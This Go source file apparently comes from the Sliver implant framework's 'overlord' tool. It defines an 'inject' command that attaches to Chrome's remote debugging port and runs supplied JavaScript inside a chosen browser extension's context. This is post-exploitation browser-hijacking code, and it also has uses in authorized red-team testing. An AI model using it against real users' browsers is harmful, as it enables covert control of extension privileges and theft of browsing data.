package cmd

/*
	Sliver Implant Framework
	Copyright (C) 2020  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"fmt"
	"net/url"
	"os"

	"github.com/moloch--/sliver-overlord/pkg/overlord"
	"github.com/spf13/cobra"
)

var injectCmd = &cobra.Command{
	Use:   "inject",
	Short: "Inject JS code",
	Long:  ``,
	Run: func(cmd *cobra.Command, args []string) {
		debuggingPort, err := cmd.Flags().GetInt(remoteDebuggingPortFlagStr)
		if err != nil {
			fmt.Printf(Warn+"Failed to parse --%s flag: %s\n", remoteDebuggingPortFlagStr, err)
			os.Exit(ExitBadFlag)
		}
		if debuggingPort < 1 || 65535 < debuggingPort {
			fmt.Printf(Warn+"Invalid port number %d\n", debuggingPort)
			os.Exit(ExitBadFlag)
		}
		extID, err := cmd.Flags().GetString(extensionIDStrFlag)
		if err != nil {
			fmt.Printf(Warn+"Failed to parse --%s flag: %s\n", extensionIDStrFlag, err)
			os.Exit(ExitBadFlag)
		}
		jsCode := getJSCode(cmd)

		debugURL := url.URL{
			Scheme: "http",
			Host:   fmt.Sprintf("localhost:%d", debuggingPort),
			Path:   "/json",
		}

		targets, err := overlord.QueryExtensionDebugTargets(debugURL.String())
		if err != nil {
			fmt.Printf(Warn+"%s\n", err)
			os.Exit(ExitDebugQueryError)
		}

		for _, target := range targets {
			extURL, err := url.Parse(target.URL)
			if err != nil {
				continue
			}
			if extURL.Scheme == "chrome-extension" && extURL.Host == extID {
				_, err := overlord.ExecuteJS(target.ID, target.WebSocketDebuggerURL, jsCode)
				if err != nil {
					os.Exit(ExitExecuteJSError)
				}
				break
			}
		}

	},
}
